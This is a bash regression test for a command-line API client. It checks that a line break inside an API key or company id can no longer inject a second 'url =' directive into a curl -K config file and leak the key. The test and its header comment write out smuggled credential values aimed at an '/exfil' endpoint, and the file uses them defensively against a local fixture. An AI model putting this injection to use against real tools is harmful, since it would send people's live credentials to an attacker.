#!/usr/bin/env bash
# cred-injection — a line break inside a credential must never reach the curl
# -K config file, and never reach a profile on disk.
#
# The bug this pins (measured 2026-07-29): `curl -K` grammar is line-based, so
# UKU_API_KEY=$'sekret-key\nurl = http://elsewhere/exfil' ended the header
# directive and opened a `url =` one. curl then performed a SECOND transfer,
# carrying the live X-API-Key, and printed nothing about it. _cfg_esc escapes
# \ and " and cannot help — no quoting spans a line break in that grammar.
#
# What makes this case different from the other 900-odd: the assertion is
# "ZERO requests left this process". The fixture's request log is the proof.
# The injected `url` is deliberately pointed AT THE FIXTURE, so a regression
# does not merely fail to refuse — it shows up as an extra logged request.
. "$(dirname "$0")/../lib/harness.sh"

setup_case
server_script <<'JSON'
{
  "routes": [
    { "method": "GET", "path": "/api/v3/clients",
      "response": {"status": 200, "body": {"data": [], "meta": {"total": 0}}} },
    { "method": "GET", "path": "/api/v3/members",
      "response": {"status": 200, "body": {"data": [{"id": 1}], "meta": {"total": 1}}} },
    { "method": "GET", "path": "/exfil",
      "response": {"status": 200, "body": {"data": []}} }
  ]
}
JSON
start_server

EXFIL="$UKU_BASE_URL/exfil"

# ── 0 control: the same command with a clean key does go out ─────────
uku clients list
assert_status 0 'a clean key is unaffected'
assert_request_count 1 'and its one request reaches the fixture'

# ── 1 the exploit itself: LF in the key, via the environment ─────────
reset_requests
UKU_API_KEY="$(printf 'sekret-key\nurl = %s' "$EXFIL")" uku clients list
assert_status 1 'a newline in UKU_API_KEY is refused (exit 1)'
assert_no_requests 'NOTHING was sent — not the read, not the injected url'
assert_err_contains 'must be a single line' 'and the refusal says why'
assert_err_contains 'API key' 'naming the value at fault'

# ── 2 CR alone counts too (a CRLF file, a Windows .env) ──────────────
reset_requests
UKU_API_KEY="$(printf 'sekret-key\rurl = %s' "$EXFIL")" uku clients list
assert_status 1 'a carriage return in UKU_API_KEY is refused'
assert_no_requests 'nothing sent'

# ── 3 the company header is the same grammar, so the same guard ──────
reset_requests
UKU_COMPANY="$(printf 'co\nurl = %s' "$EXFIL")" uku clients list
assert_status 1 'a newline in UKU_COMPANY is refused'
assert_no_requests 'nothing sent'
assert_err_contains 'company id' 'and it names the company, not the key'

# ── 4 a WRITE is refused before the write doctrine even starts ───────
reset_requests
UKU_API_KEY="$(printf 'sekret-key\nurl = %s' "$EXFIL")" uku tasks create --data '{"title":"x"}' --yes
assert_status 1 'a write with a broken key is refused'
assert_no_requests 'and creates nothing'

# ── 5 --dry-run is refused too ───────────────────────────────────────
# It is the command an agent runs before every write, and it is the one that
# writes the -K config and then exits — the guard has to come first.
reset_requests
UKU_API_KEY="$(printf 'sekret-key\nurl = %s' "$EXFIL")" uku tasks create --data '{"title":"x"}' --dry-run
assert_status 1 '--dry-run with a broken key is refused, not previewed'
assert_no_requests 'nothing sent'

# ── 6 via --key-stdin: _trim strips the ENDS, not the middle ─────────
# A key read from a file can carry a break in the middle and reach save_profile
# intact. Nothing may be sent, and nothing may be stored.
reset_requests
clear_env_creds
printf 'sekret-key\nurl = %s' "$EXFIL" > "$CASE_DIR/key.txt"
uku_stdin "$CASE_DIR/key.txt" auth login --account ci --company "$TEST_COMPANY" --key-stdin
assert_status 1 'login with a broken key on stdin is refused'
assert_no_requests 'the credential was never even validated against the API'
if [ -e "$UKU_CONFIG_HOME/profiles/ci" ]; then
  _tap_fail 'no profile was written' "profile file exists: $UKU_CONFIG_HOME/profiles/ci
$(_diag)"
else
  _tap_ok 'no profile was written'
fi

# a key that is merely PADDED with whitespace still logs in — _trim's job is
# untouched, and breaking it would be a usability regression, not a fix.
reset_requests
printf '  %s  \n' "$TEST_API_KEY" > "$CASE_DIR/key2.txt"
uku_stdin "$CASE_DIR/key2.txt" auth login --account ci --company "$TEST_COMPANY" --key-stdin
assert_status 0 'a padded but single-line key still logs in'
assert_file_exists "$UKU_CONFIG_HOME/profiles/ci" 'and the profile is written'

# ── 7 via a profile file ─────────────────────────────────────────────
# A profile cannot carry an LF through — _profile_get greps ONE line, so the
# injected directive is simply not read. That is luck, not design, so it is
# pinned here: the guarantee is "one request, to the real path".
reset_requests
clear_env_creds
mkdir -p "$UKU_CONFIG_HOME/profiles"
{ printf 'UKU_BASE=%s\n' "$UKU_BASE_URL"
  printf 'UKU_COMPANY=%s\n' "$TEST_COMPANY"
  printf 'UKU_KEY=sekret-key\n'
  printf 'url = %s\n' "$EXFIL"
} > "$UKU_CONFIG_HOME/profiles/split"
chmod 600 "$UKU_CONFIG_HOME/profiles/split"
uku --account split clients list
assert_status 0 'a profile whose next line looks like a curl directive still works'
assert_request_count 1 'and it sends exactly one request'
assert_request 1 path '/api/v3/clients' 'to the path that was asked for'

# a CR at the end of a profile line DOES survive the grep, so it must be caught
reset_requests
{ printf 'UKU_BASE=%s\n' "$UKU_BASE_URL"
  printf 'UKU_COMPANY=%s\n' "$TEST_COMPANY"
  printf 'UKU_KEY=sekret-key\r\n'
} > "$UKU_CONFIG_HOME/profiles/crlf"
chmod 600 "$UKU_CONFIG_HOME/profiles/crlf"
uku --account crlf clients list
assert_status 1 'a CRLF profile line is refused rather than sent'
assert_no_requests 'nothing sent'

finish
